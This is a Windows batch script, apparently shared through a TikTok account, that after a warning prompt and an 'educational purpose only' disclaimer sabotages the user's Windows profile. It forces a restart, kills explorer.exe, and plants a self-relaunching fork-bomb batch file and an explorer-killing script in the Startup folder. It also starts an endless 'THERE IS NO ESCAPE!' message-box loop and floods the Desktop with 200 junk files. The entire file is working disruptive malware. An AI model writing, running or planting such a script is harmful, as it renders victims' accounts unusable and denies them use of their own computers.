@echo off

C:\~\checkcode.bat
cls

echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo Are you sure you want to continue? This will make your profile unusable!
echo.
echo Press any key to continue or close this window to cancel
echo.
echo Created by https://www.tiktok.com/@scripts.bat. Showcase video: https://www.tiktok.com/@scripts.bat/video/7124918384411561222
echo.
echo For educational purpose only! Do not use without anyones permission!
pause>>nul
cls

shutdown /g /f

start explorer.exe
taskkill /F /IM explorer.exe>>nul

cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

echo @echo off>>Windows.bat
echo cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup">>Windows.bat
echo :a>>Windows.bat
echo start Windows.bat>>Windows.bat
echo goto a>>Windows.bat

echo @echo off>>.bat
echo cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup">>.bat
echo start explorer.exe>>.bat
echo taskkill /F /IM explorer.exe>>.bat
echo start Windows.bat>>.bat

echo Do While ^1>>.vbs
echo msgbox "THERE IS NO ESCAPE!",0+16,"lol" >>.vbs
echo Loop>>.vbs

start .vbs

cd %USERPROFILE%\Desktop
for /l %%x in (1, 1, 200) do echo THERE IS NO ESCAPE! %RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%>>%%x.txt